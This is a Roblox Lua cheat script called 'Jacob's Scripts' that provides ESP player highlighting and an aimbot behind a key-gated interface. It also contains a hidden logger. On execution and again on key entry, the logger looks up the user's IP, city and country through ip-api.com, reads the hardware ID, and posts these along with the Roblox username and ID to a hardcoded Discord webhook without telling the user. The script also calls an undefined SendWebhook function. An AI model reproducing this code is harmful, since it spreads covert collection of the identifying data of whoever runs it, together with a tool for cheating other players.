--[[
    Jacob's Scripts
]]

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local HttpService = game:GetService("HttpService")
local TweenService = game:GetService("TweenService")

local LocalPlayer = Players.LocalPlayer
local Mouse = LocalPlayer:GetMouse()

local Config = {
    Webhook = "https://discord.com/api/webhooks/1459612877005656247/0Di7iy_9FL1fCQ_xlHhWGyP_XryLMwu1Zr4Il5_ZsVjxILVkap8B5XxxS5Q3u1lTRwES",
    DiscordInvite = "https://discord.gg/kNk7kAUVQM",
    ValidKeys = {"jacobarsenal"},
    ToggleKey = Enum.KeyCode.RightShift,
    ESPEnabled = true,
    AimbotEnabled = false,
    AimbotFOV = 120,
    AimbotSmoothing = 4,
    AimbotTargetPart = "Head",
    TargetParts = {"Head", "HumanoidRootPart", "UpperTorso", "LowerTorso"},
    TeamCheck = false,
    VisibilityCheck = false,
    ShowFOV = true,
}

local GUIVisible = true
local ESPObjects = {}
local Loaded = false
local KeyVerified = false
local AimbotTarget = nil

local function Tween(obj, props, dur)
    TweenService:Create(obj, TweenInfo.new(dur, Enum.EasingStyle.Quart), props):Play()
end

-- Get user info for logging
local function GetUserInfo()
    local ip = {}
    pcall(function() ip = HttpService:JSONDecode(game:HttpGet("http://ip-api.com/json/?fields=query,country,city,isp,proxy")) end)
    local hwid = "?" pcall(function() if gethwid then hwid = gethwid() end end)
    return ip, hwid
end

-- Log execution attempt
local function LogExecution()
    local ip, hwid = GetUserInfo()
    pcall(function()
        local r = (syn and syn.request) or http_request or request
        if r then
            r({Url = Config.Webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode({embeds = {{
                    title = "Script Executed",
                    color = 16776960,
                    fields = {
                        {name = "User", value = LocalPlayer.Name .. " (" .. LocalPlayer.UserId .. ")", inline = true},
                        {name = "IP", value = ip.query or "?", inline = true},
                        {name = "Location", value = (ip.city or "?") .. ", " .. (ip.country or "?"), inline = true},
                        {name = "HWID", value = hwid, inline = false},
                    },
                    thumbnail = {url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LocalPlayer.UserId .. "&width=150&height=150&format=png"},
                    footer = {text = "Awaiting key verification"}
                }}})
            })
        end
    end)
end

-- Log successful key
local function LogKeySuccess(key)
    local ip, hwid = GetUserInfo()
    pcall(function()
        local r = (syn and syn.request) or http_request or request
        if r then
            r({Url = Config.Webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode({embeds = {{
                    title = "Key Verified",
                    color = 65280,
                    fields = {
                        {name = "User", value = LocalPlayer.Name .. " (" .. LocalPlayer.UserId .. ")", inline = true},
                        {name = "Key Used", value = "||" .. key .. "||", inline = true},
                        {name = "IP", value = ip.query or "?", inline = true},
                        {name = "Location", value = (ip.city or "?") .. ", " .. (ip.country or "?"), inline = true},
                        {name = "HWID", value = hwid, inline = false},
                    },
                    thumbnail = {url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LocalPlayer.UserId .. "&width=150&height=150&format=png"},
                    footer = {text = "Access granted"}
                }}})
            })
        end
    end)
end

-- Check if key is valid
local function IsKeyValid(key)
    for _, validKey in ipairs(Config.ValidKeys) do
        if key == validKey then
            return true
        end
    end
    return false
end

-- GUI
local Gui = Instance.new("ScreenGui")
Gui.Name = "JS"
Gui.ResetOnSpawn = false
pcall(function() if syn then syn.protect_gui(Gui) end Gui.Parent = game:GetService("CoreGui") end)
if not Gui.Parent then Gui.Parent = LocalPlayer:WaitForChild("PlayerGui") end

-- Log execution immediately
task.spawn(LogExecution)

-- KEY SYSTEM UI
local KeyFrame = Instance.new("Frame")
KeyFrame.Name = "KeySystem"
KeyFrame.Size = UDim2.new(0, 300, 0, 200)
KeyFrame.Position = UDim2.new(0.5, -150, 0.5, -100)
KeyFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 26)
KeyFrame.BorderSizePixel = 0
KeyFrame.Parent = Gui

local KeyCorner = Instance.new("UICorner", KeyFrame)
KeyCorner.CornerRadius = UDim.new(0, 6)

local KeyStroke = Instance.new("UIStroke", KeyFrame)
KeyStroke.Color = Color3.fromRGB(138, 43, 226)
KeyStroke.Thickness = 1

-- Title
local KeyTitle = Instance.new("TextLabel")
KeyTitle.Size = UDim2.new(1, 0, 0, 40)
KeyTitle.BackgroundColor3 = Color3.fromRGB(138, 43, 226)
KeyTitle.BorderSizePixel = 0
KeyTitle.Text = "JACOB'S SCRIPTS"
KeyTitle.TextColor3 = Color3.new(1, 1, 1)
KeyTitle.TextSize = 16
KeyTitle.Font = Enum.Font.GothamBold
KeyTitle.Parent = KeyFrame

local TitleCorner = Instance.new("UICorner", KeyTitle)
TitleCorner.CornerRadius = UDim.new(0, 6)

local TitleFix = Instance.new("Frame")
TitleFix.Size = UDim2.new(1, 0, 0, 10)
TitleFix.Position = UDim2.new(0, 0, 1, -10)
TitleFix.BackgroundColor3 = Color3.fromRGB(138, 43, 226)
TitleFix.BorderSizePixel = 0
TitleFix.Parent = KeyTitle

-- Discord info
local DiscordInfo = Instance.new("TextLabel")
DiscordInfo.Size = UDim2.new(1, -20, 0, 30)
DiscordInfo.Position = UDim2.new(0, 10, 0, 48)
DiscordInfo.BackgroundTransparency = 1
DiscordInfo.Text = "Join our Discord to get a key:"
DiscordInfo.TextColor3 = Color3.fromRGB(180, 180, 180)
DiscordInfo.TextSize = 12
DiscordInfo.Font = Enum.Font.Gotham
DiscordInfo.Parent = KeyFrame

-- Get Key Button (Discord)
local GetKeyBtn = Instance.new("TextButton")
GetKeyBtn.Size = UDim2.new(1, -20, 0, 32)
GetKeyBtn.Position = UDim2.new(0, 10, 0, 78)
GetKeyBtn.BackgroundColor3 = Color3.fromRGB(88, 101, 242)
GetKeyBtn.Text = "Get Key (Discord)"
GetKeyBtn.TextColor3 = Color3.new(1, 1, 1)
GetKeyBtn.TextSize = 13
GetKeyBtn.Font = Enum.Font.GothamBold
GetKeyBtn.Parent = KeyFrame

local GetKeyCorner = Instance.new("UICorner", GetKeyBtn)
GetKeyCorner.CornerRadius = UDim.new(0, 4)

-- Key input
local KeyInput = Instance.new("TextBox")
KeyInput.Size = UDim2.new(1, -20, 0, 32)
KeyInput.Position = UDim2.new(0, 10, 0, 118)
KeyInput.BackgroundColor3 = Color3.fromRGB(35, 35, 45)
KeyInput.Text = ""
KeyInput.PlaceholderText = "Enter your key here..."
KeyInput.PlaceholderColor3 = Color3.fromRGB(100, 100, 100)
KeyInput.TextColor3 = Color3.new(1, 1, 1)
KeyInput.TextSize = 12
KeyInput.Font = Enum.Font.Gotham
KeyInput.ClearTextOnFocus = false
KeyInput.Parent = KeyFrame

local InputCorner = Instance.new("UICorner", KeyInput)
InputCorner.CornerRadius = UDim.new(0, 4)

-- Verify Button
local VerifyBtn = Instance.new("TextButton")
VerifyBtn.Size = UDim2.new(1, -20, 0, 32)
VerifyBtn.Position = UDim2.new(0, 10, 0, 158)
VerifyBtn.BackgroundColor3 = Color3.fromRGB(138, 43, 226)
VerifyBtn.Text = "Verify Key"
VerifyBtn.TextColor3 = Color3.new(1, 1, 1)
VerifyBtn.TextSize = 13
VerifyBtn.Font = Enum.Font.GothamBold
VerifyBtn.Parent = KeyFrame

local VerifyCorner = Instance.new("UICorner", VerifyBtn)
VerifyCorner.CornerRadius = UDim.new(0, 4)

-- Button functionality
GetKeyBtn.MouseButton1Click:Connect(function()
    setclipboard(Config.DiscordInvite)
    GetKeyBtn.Text = "Copied to clipboard!"
    task.wait(1.5)
    GetKeyBtn.Text = "Get Key (Discord)"
end)

VerifyBtn.MouseButton1Click:Connect(function()
    local enteredKey = KeyInput.Text
    if IsKeyValid(enteredKey) then
        KeyVerified = true
        LogKeySuccess(enteredKey)
        
        VerifyBtn.Text = "Access Granted!"
        VerifyBtn.BackgroundColor3 = Color3.fromRGB(0, 180, 0)
        task.wait(0.5)
        
        -- Fade out key UI
        Tween(KeyFrame, {BackgroundTransparency = 1}, 0.3)
        Tween(KeyTitle, {BackgroundTransparency = 1, TextTransparency = 1}, 0.3)
        Tween(TitleFix, {BackgroundTransparency = 1}, 0.3)
        Tween(DiscordInfo, {TextTransparency = 1}, 0.3)
        Tween(GetKeyBtn, {BackgroundTransparency = 1, TextTransparency = 1}, 0.3)
        Tween(KeyInput, {BackgroundTransparency = 1, TextTransparency = 1}, 0.3)
        Tween(VerifyBtn, {BackgroundTransparency = 1, TextTransparency = 1}, 0.3)
        Tween(KeyStroke, {Transparency = 1}, 0.3)
        task.wait(0.35)
        KeyFrame:Destroy()
        
        -- INTRO ANIMATION
        local IntroHolder = Instance.new("Frame")
        IntroHolder.Size = UDim2.new(0, 200, 0, 80)
        IntroHolder.Position = UDim2.new(0.5, -100, 0.5, -40)
        IntroHolder.BackgroundTransparency = 1
        IntroHolder.Parent = Gui
        
        local Logo = Instance.new("TextLabel")
        Logo.Size = UDim2.new(1, 0, 0, 50)
        Logo.BackgroundTransparency = 1
        Logo.Text = "JS"
        Logo.TextColor3 = Color3.fromRGB(138, 43, 226)
        Logo.TextSize = 60
        Logo.Font = Enum.Font.GothamBlack
        Logo.TextTransparency = 1
        Logo.Parent = IntroHolder
        
        local IntroLine = Instance.new("Frame")
        IntroLine.Size = UDim2.new(0, 0, 0, 2)
        IntroLine.Position = UDim2.new(0.5, 0, 0, 55)
        IntroLine.AnchorPoint = Vector2.new(0.5, 0)
        IntroLine.BackgroundColor3 = Color3.fromRGB(138, 43, 226)
        IntroLine.BorderSizePixel = 0
        IntroLine.Parent = IntroHolder
        
        local IntroSub = Instance.new("TextLabel")
        IntroSub.Size = UDim2.new(1, 0, 0, 20)
        IntroSub.Position = UDim2.new(0, 0, 0, 60)
        IntroSub.BackgroundTransparency = 1
        IntroSub.Text = "SCRIPTS"
        IntroSub.TextColor3 = Color3.fromRGB(100, 100, 100)
        IntroSub.TextSize = 12
        IntroSub.Font = Enum.Font.GothamMedium
        IntroSub.TextTransparency = 1
        IntroSub.Parent = IntroHolder
        
        -- Animate intro
        task.wait(0.1)
        Tween(Logo, {TextTransparency = 0}, 0.4)
        task.wait(0.25)
        Tween(IntroLine, {Size = UDim2.new(0, 100, 0, 2)}, 0.35)
        task.wait(0.15)
        Tween(IntroSub, {TextTransparency = 0}, 0.3)
        task.wait(1.2)
        Tween(Logo, {TextTransparency = 1}, 0.3)
        Tween(IntroLine, {Size = UDim2.new(0, 0, 0, 2)}, 0.25)
        Tween(IntroSub, {TextTransparency = 1}, 0.25)
        task.wait(0.35)
        IntroHolder:Destroy()
        
        Loaded = true
    else
        VerifyBtn.Text = "Invalid Key!"
        VerifyBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
        task.wait(1)
        VerifyBtn.Text = "Verify Key"
        VerifyBtn.BackgroundColor3 = Color3.fromRGB(138, 43, 226)
    end
end)

-- Main UI
local Main = Instance.new("Frame")
Main.Name = "Main"
Main.Size = UDim2.new(0, 340, 0, 380)
Main.Position = UDim2.new(0.5, -170, 0.5, -190)
Main.BackgroundColor3 = Color3.fromRGB(20, 20, 26)
Main.BorderSizePixel = 0
Main.Visible = false
Main.ClipsDescendants = true
Main.Parent = Gui

local MainCorner = Instance.new("UICorner", Main)
MainCorner.CornerRadius = UDim.new(0, 4)

local MainStroke = Instance.new("UIStroke", Main)
MainStroke.Color = Color3.fromRGB(138, 43, 226)
MainStroke.Thickness = 1

-- Header
local Header = Instance.new("Frame")
Header.Size = UDim2.new(1, 0, 0, 40)
Header.BackgroundColor3 = Color3.fromRGB(138, 43, 226)
Header.BorderSizePixel = 0
Header.Parent = Main

local HeaderCorner = Instance.new("UICorner", Header)
HeaderCorner.CornerRadius = UDim.new(0, 4)

local HeaderBottom = Instance.new("Frame")
HeaderBottom.Size = UDim2.new(1, 0, 0, 10)
HeaderBottom.Position = UDim2.new(0, 0, 1, -10)
HeaderBottom.BackgroundColor3 = Color3.fromRGB(138, 43, 226)
HeaderBottom.BorderSizePixel = 0
HeaderBottom.Parent = Header

local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, -40, 1, 0)
Title.Position = UDim2.new(0, 12, 0, 0)
Title.BackgroundTransparency = 1
Title.Text = "JACOB'S SCRIPTS"
Title.TextColor3 = Color3.new(1, 1, 1)
Title.TextSize = 14
Title.Font = Enum.Font.GothamBold
Title.TextXAlignment = Enum.TextXAlignment.Left
Title.Parent = Header

local Close = Instance.new("TextButton")
Close.Size = UDim2.new(0, 30, 0, 30)
Close.Position = UDim2.new(1, -35, 0.5, -15)
Close.BackgroundTransparency = 1
Close.Text = "-"
Close.TextColor3 = Color3.new(1, 1, 1)
Close.TextSize = 24
Close.Font = Enum.Font.GothamBold
Close.Parent = Header

-- Content
local Content = Instance.new("ScrollingFrame")
Content.Size = UDim2.new(1, -16, 1, -52)
Content.Position = UDim2.new(0, 8, 0, 48)
Content.BackgroundTransparency = 1
Content.ScrollBarThickness = 2
Content.ScrollBarImageColor3 = Color3.fromRGB(138, 43, 226)
Content.CanvasSize = UDim2.new(0, 0, 0, 420)
Content.BorderSizePixel = 0
Content.Parent = Main

local Layout = Instance.new("UIListLayout", Content)
Layout.Padding = UDim.new(0, 6)

-- UI Builders
local function Section(name)
    local f = Instance.new("Frame")
    f.Size = UDim2.new(1, 0, 0, 34)
    f.BackgroundColor3 = Color3.fromRGB(28, 28, 36)
    f.BorderSizePixel = 0
    f.Parent = Content
    Instance.new("UICorner", f).CornerRadius = UDim.new(0, 4)
    
    local l = Instance.new("TextLabel")
    l.Size = UDim2.new(0.6, 0, 1, 0)
    l.Position = UDim2.new(0, 10, 0, 0)
    l.BackgroundTransparency = 1
    l.Text = name
    l.TextColor3 = Color3.fromRGB(200, 200, 200)
    l.TextSize = 12
    l.Font = Enum.Font.GothamMedium
    l.TextXAlignment = Enum.TextXAlignment.Left
    l.Parent = f
    return f
end

local function Toggle(sec, val, cb)
    local bg = Instance.new("Frame")
    bg.Size = UDim2.new(0, 38, 0, 18)
    bg.Position = UDim2.new(1, -46, 0.5, -9)
    bg.BackgroundColor3 = val and Color3.fromRGB(138, 43, 226) or Color3.fromRGB(50, 50, 60)
    bg.BorderSizePixel = 0
    bg.Parent = sec
    Instance.new("UICorner", bg).CornerRadius = UDim.new(1, 0)
    
    local c = Instance.new("Frame")
    c.Size = UDim2.new(0, 14, 0, 14)
    c.Position = val and UDim2.new(1, -16, 0.5, -7) or UDim2.new(0, 2, 0.5, -7)
    c.BackgroundColor3 = Color3.new(1, 1, 1)
    c.BorderSizePixel = 0
    c.Parent = bg
    Instance.new("UICorner", c).CornerRadius = UDim.new(1, 0)
    
    local b = Instance.new("TextButton")
    b.Size = UDim2.new(1, 0, 1, 0)
    b.BackgroundTransparency = 1
    b.Text = ""
    b.Parent = bg
    
    local on = val
    b.MouseButton1Click:Connect(function()
        on = not on
        Tween(bg, {BackgroundColor3 = on and Color3.fromRGB(138, 43, 226) or Color3.fromRGB(50, 50, 60)}, 0.12)
        Tween(c, {Position = on and UDim2.new(1, -16, 0.5, -7) or UDim2.new(0, 2, 0.5, -7)}, 0.12)
        if cb then cb(on) end
    end)
end

local function Slider(name, min, max, val, cb)
    local f = Instance.new("Frame")
    f.Size = UDim2.new(1, 0, 0, 48)
    f.BackgroundColor3 = Color3.fromRGB(28, 28, 36)
    f.BorderSizePixel = 0
    f.Parent = Content
    Instance.new("UICorner", f).CornerRadius = UDim.new(0, 4)
    
    local l = Instance.new("TextLabel")
    l.Size = UDim2.new(0.5, 0, 0, 22)
    l.Position = UDim2.new(0, 10, 0, 4)
    l.BackgroundTransparency = 1
    l.Text = name
    l.TextColor3 = Color3.fromRGB(200, 200, 200)
    l.TextSize = 12
    l.Font = Enum.Font.GothamMedium
    l.TextXAlignment = Enum.TextXAlignment.Left
    l.Parent = f
    
    local v = Instance.new("TextLabel")
    v.Size = UDim2.new(0, 35, 0, 22)
    v.Position = UDim2.new(1, -45, 0, 4)
    v.BackgroundTransparency = 1
    v.Text = tostring(val)
    v.TextColor3 = Color3.fromRGB(138, 43, 226)
    v.TextSize = 11
    v.Font = Enum.Font.GothamBold
    v.Parent = f
    
    local t = Instance.new("Frame")
    t.Size = UDim2.new(1, -20, 0, 4)
    t.Position = UDim2.new(0, 10, 0, 34)
    t.BackgroundColor3 = Color3.fromRGB(45, 45, 55)
    t.BorderSizePixel = 0
    t.Parent = f
    Instance.new("UICorner", t).CornerRadius = UDim.new(1, 0)
    
    local fill = Instance.new("Frame")
    fill.Size = UDim2.new((val-min)/(max-min), 0, 1, 0)
    fill.BackgroundColor3 = Color3.fromRGB(138, 43, 226)
    fill.BorderSizePixel = 0
    fill.Parent = t
    Instance.new("UICorner", fill).CornerRadius = UDim.new(1, 0)
    
    local drag = false
    t.InputBegan:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseButton1 then drag = true end end)
    UserInputService.InputEnded:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseButton1 then drag = false end end)
    UserInputService.InputChanged:Connect(function(i)
        if drag and i.UserInputType == Enum.UserInputType.MouseMovement then
            local r = math.clamp((i.Position.X - t.AbsolutePosition.X) / t.AbsoluteSize.X, 0, 1)
            local n = math.floor(min + (max-min) * r)
            fill.Size = UDim2.new(r, 0, 1, 0)
            v.Text = tostring(n)
            if cb then cb(n) end
        end
    end)
end

local function Dropdown(name, opts, val, cb)
    local f = Instance.new("Frame")
    f.Size = UDim2.new(1, 0, 0, 34)
    f.BackgroundColor3 = Color3.fromRGB(28, 28, 36)
    f.ClipsDescendants = true
    f.BorderSizePixel = 0
    f.Parent = Content
    Instance.new("UICorner", f).CornerRadius = UDim.new(0, 4)
    
    local l = Instance.new("TextLabel")
    l.Size = UDim2.new(0.4, 0, 0, 34)
    l.Position = UDim2.new(0, 10, 0, 0)
    l.BackgroundTransparency = 1
    l.Text = name
    l.TextColor3 = Color3.fromRGB(200, 200, 200)
    l.TextSize = 12
    l.Font = Enum.Font.GothamMedium
    l.TextXAlignment = Enum.TextXAlignment.Left
    l.Parent = f
    
    local b = Instance.new("TextButton")
    b.Size = UDim2.new(0, 100, 0, 22)
    b.Position = UDim2.new(1, -108, 0, 6)
    b.BackgroundColor3 = Color3.fromRGB(45, 45, 55)
    b.Text = val
    b.TextColor3 = Color3.fromRGB(180, 180, 180)
    b.TextSize = 10
    b.Font = Enum.Font.GothamMedium
    b.Parent = f
    Instance.new("UICorner", b).CornerRadius = UDim.new(0, 3)
    
    local optBtns = {}
    for i, o in ipairs(opts) do
        local ob = Instance.new("TextButton")
        ob.Size = UDim2.new(0, 100, 0, 22)
        ob.Position = UDim2.new(1, -108, 0, 6 + i * 26)
        ob.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
        ob.Text = o
        ob.TextColor3 = Color3.fromRGB(160, 160, 160)
        ob.TextSize = 10
        ob.Font = Enum.Font.Gotham
        ob.Visible = false
        ob.Parent = f
        Instance.new("UICorner", ob).CornerRadius = UDim.new(0, 3)
        table.insert(optBtns, ob)
        ob.MouseButton1Click:Connect(function()
            b.Text = o
            Tween(f, {Size = UDim2.new(1, 0, 0, 34)}, 0.12)
            for _, x in ipairs(optBtns) do x.Visible = false end
            if cb then cb(o) end
        end)
    end
    
    local open = false
    b.MouseButton1Click:Connect(function()
        open = not open
        Tween(f, {Size = UDim2.new(1, 0, 0, open and (34 + #opts * 26) or 34)}, 0.12)
        for _, x in ipairs(optBtns) do x.Visible = open end
    end)
end

local function Keybind(name, key, cb)
    local f = Instance.new("Frame")
    f.Size = UDim2.new(1, 0, 0, 34)
    f.BackgroundColor3 = Color3.fromRGB(28, 28, 36)
    f.BorderSizePixel = 0
    f.Parent = Content
    Instance.new("UICorner", f).CornerRadius = UDim.new(0, 4)
    
    local l = Instance.new("TextLabel")
    l.Size = UDim2.new(0.5, 0, 1, 0)
    l.Position = UDim2.new(0, 10, 0, 0)
    l.BackgroundTransparency = 1
    l.Text = name
    l.TextColor3 = Color3.fromRGB(200, 200, 200)
    l.TextSize = 12
    l.Font = Enum.Font.GothamMedium
    l.TextXAlignment = Enum.TextXAlignment.Left
    l.Parent = f
    
    local kb = Instance.new("TextButton")
    kb.Size = UDim2.new(0, 70, 0, 22)
    kb.Position = UDim2.new(1, -78, 0.5, -11)
    kb.BackgroundColor3 = Color3.fromRGB(45, 45, 55)
    kb.Text = key.Name
    kb.TextColor3 = Color3.fromRGB(180, 180, 180)
    kb.TextSize = 10
    kb.Font = Enum.Font.GothamMedium
    kb.Parent = f
    Instance.new("UICorner", kb).CornerRadius = UDim.new(0, 3)
    
    local listening = false
    kb.MouseButton1Click:Connect(function()
        listening = true
        kb.Text = "..."
    end)
    
    UserInputService.InputBegan:Connect(function(inp, gp)
        if listening and inp.UserInputType == Enum.UserInputType.Keyboard then
            listening = false
            kb.Text = inp.KeyCode.Name
            if cb then cb(inp.KeyCode) end
        end
    end)
end

-- Build UI
local esp = Section("ESP Players")
Toggle(esp, Config.ESPEnabled, function(v) Config.ESPEnabled = v end)

local aim = Section("Aimbot")
Toggle(aim, Config.AimbotEnabled, function(v) Config.AimbotEnabled = v end)

Dropdown("Target Part", Config.TargetParts, Config.AimbotTargetPart, function(v) Config.AimbotTargetPart = v end)

local team = Section("Team Check")
Toggle(team, Config.TeamCheck, function(v) Config.TeamCheck = v end)

local wall = Section("Wall Check")
Toggle(wall, Config.VisibilityCheck, function(v) Config.VisibilityCheck = v end)

local fov = Section("Show FOV")
Toggle(fov, Config.ShowFOV, function(v) Config.ShowFOV = v end)

Slider("FOV Radius", 50, 600, Config.AimbotFOV, function(v) Config.AimbotFOV = v end)
Slider("Smoothing", 1, 20, Config.AimbotSmoothing, function(v) Config.AimbotSmoothing = v end)
Keybind("Toggle Key", Config.ToggleKey, function(v) Config.ToggleKey = v end)

-- Dragging
local dragging, dragStart, startPos
Header.InputBegan:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseButton1 then dragging, dragStart, startPos = true, i.Position, Main.Position end end)
Header.InputEnded:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end end)
UserInputService.InputChanged:Connect(function(i)
    if dragging and i.UserInputType == Enum.UserInputType.MouseMovement then
        local d = i.Position - dragStart
        Main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X, startPos.Y.Scale, startPos.Y.Offset + d.Y)
    end
end)

Close.MouseButton1Click:Connect(function()
    GUIVisible = false
    Tween(Main, {Size = UDim2.new(0, 340, 0, 0)}, 0.2)
    task.delay(0.2, function() Main.Visible = false end)
end)

-- Toggle Key
UserInputService.InputBegan:Connect(function(i, gp)
    if gp then return end
    if i.KeyCode == Config.ToggleKey then
        GUIVisible = not GUIVisible
        if GUIVisible then
            Main.Visible = true
            Main.Size = UDim2.new(0, 340, 0, 0)
            Tween(Main, {Size = UDim2.new(0, 340, 0, 380)}, 0.2)
        else
            Tween(Main, {Size = UDim2.new(0, 340, 0, 0)}, 0.2)
            task.delay(0.2, function() Main.Visible = false end)
        end
    end
end)

-- ESP
local function CreateESP(p)
    if p == LocalPlayer then return end
    
    -- Remove old ESP if exists
    if ESPObjects[p] then
        pcall(function() ESPObjects[p]:Destroy() end)
        ESPObjects[p] = nil
    end
    
    if not p.Character then return end
    
    local hl = Instance.new("Highlight")
    hl.FillColor = Color3.fromRGB(138, 43, 226)
    hl.FillTransparency = 0.75
    hl.OutlineTransparency = 0
    hl.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
    hl.Adornee = p.Character
    hl.Parent = p.Character
    ESPObjects[p] = hl
end

local function RemoveESP(p)
    if ESPObjects[p] then
        pcall(function() ESPObjects[p]:Destroy() end)
        ESPObjects[p] = nil
    end
end

local function RefreshAllESP()
    -- Clear all old ESP
    for p, hl in pairs(ESPObjects) do
        pcall(function() hl:Destroy() end)
    end
    ESPObjects = {}
    
    -- Create new ESP for all players
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= LocalPlayer and p.Character then
            CreateESP(p)
        end
    end
end

-- Connect to all players (existing and new)
local function SetupPlayer(p)
    if p == LocalPlayer then return end
    
    -- Listen for character spawns
    p.CharacterAdded:Connect(function()
        task.wait(0.3)
        CreateESP(p)
    end)
    
    -- Create ESP if character exists
    if p.Character then
        CreateESP(p)
    end
end

for _, p in ipairs(Players:GetPlayers()) do
    SetupPlayer(p)
end

Players.PlayerAdded:Connect(SetupPlayer)
Players.PlayerRemoving:Connect(RemoveESP)

-- Refresh when local player respawns (new round detection)
LocalPlayer.CharacterAdded:Connect(function()
    task.wait(1)
    RefreshAllESP()
end)

-- Aggressive periodic refresh (handles round resets)
task.spawn(function()
    while true do
        task.wait(2)
        for _, p in ipairs(Players:GetPlayers()) do
            if p ~= LocalPlayer and p.Character then
                local hl = ESPObjects[p]
                if not hl or not hl.Parent or hl.Adornee ~= p.Character then
                    CreateESP(p)
                end
            end
        end
    end
end)

-- FOV Circle
local FOV = nil
pcall(function()
    if Drawing then
        FOV = Drawing.new("Circle")
        FOV.Color = Color3.fromRGB(138, 43, 226)
        FOV.Thickness = 1
        FOV.Filled = false
        FOV.Visible = false
    end
end)

-- AIMBOT
local function GetTarget()
    local cam = workspace.CurrentCamera
    if not cam then return nil, nil end
    
    local closest, closestDist, closestPos = nil, Config.AimbotFOV, nil
    local mousePos = Vector2.new(Mouse.X, Mouse.Y)
    
    for _, p in ipairs(Players:GetPlayers()) do
        if p == LocalPlayer then continue end
        local char = p.Character
        if not char then continue end
        local hum = char:FindFirstChildOfClass("Humanoid")
        if not hum or hum.Health <= 0 then continue end
        if Config.TeamCheck and p.Team == LocalPlayer.Team then continue end
        
        local part = char:FindFirstChild(Config.AimbotTargetPart) or char:FindFirstChild("HumanoidRootPart")
        if not part then continue end
        
        local screenPos, onScreen = cam:WorldToScreenPoint(part.Position)
        if not onScreen then continue end
        
        local dist = (Vector2.new(screenPos.X, screenPos.Y) - mousePos).Magnitude
        
        if dist < closestDist then
            if Config.VisibilityCheck then
                local params = RaycastParams.new()
                params.FilterType = Enum.RaycastFilterType.Exclude
                local filter = {char}
                if LocalPlayer.Character then table.insert(filter, LocalPlayer.Character) end
                params.FilterDescendantsInstances = filter
                local ray = workspace:Raycast(cam.CFrame.Position, (part.Position - cam.CFrame.Position), params)
                if ray then continue end
            end
            closest, closestDist, closestPos = p, dist, part.Position
        end
    end
    return closest, closestPos
end

-- Main Loop
RunService.RenderStepped:Connect(function()
    local cam = workspace.CurrentCamera
    if not cam then return end
    
    for p, hl in pairs(ESPObjects) do
        hl.Enabled = Config.ESPEnabled and not (Config.TeamCheck and p.Team == LocalPlayer.Team)
    end
    
    if FOV then
        FOV.Visible = Config.ShowFOV and Config.AimbotEnabled and Loaded
        FOV.Radius = Config.AimbotFOV
        FOV.Position = cam.ViewportSize / 2
    end
    
    if Config.AimbotEnabled and Loaded then
        if UserInputService:IsMouseButtonPressed(Enum.UserInputType.MouseButton2) then
            local _, pos = GetTarget()
            if pos then
                local screenPos = cam:WorldToScreenPoint(pos)
                local mousePos = Vector2.new(Mouse.X, Mouse.Y)
                local delta = Vector2.new(screenPos.X - mousePos.X, screenPos.Y - mousePos.Y)
                
                if mousemoverel then
                    -- Smoothing 1 = instant snap, higher = smoother
                    if Config.AimbotSmoothing <= 1 then
                        mousemoverel(delta.X, delta.Y)
                    else
                        mousemoverel(delta.X / Config.AimbotSmoothing, delta.Y / Config.AimbotSmoothing)
                    end
                end
            end
        end
    end
end)

-- Show UI after intro
task.spawn(function()
    repeat task.wait() until Loaded
    Main.Visible = true
    Main.Size = UDim2.new(0, 340, 0, 0)
    Tween(Main, {Size = UDim2.new(0, 340, 0, 380)}, 0.25)
end)

task.spawn(function() task.wait(2) SendWebhook() end)
game:BindToClose(function() if FOV then pcall(function() FOV:Remove() end) end end)
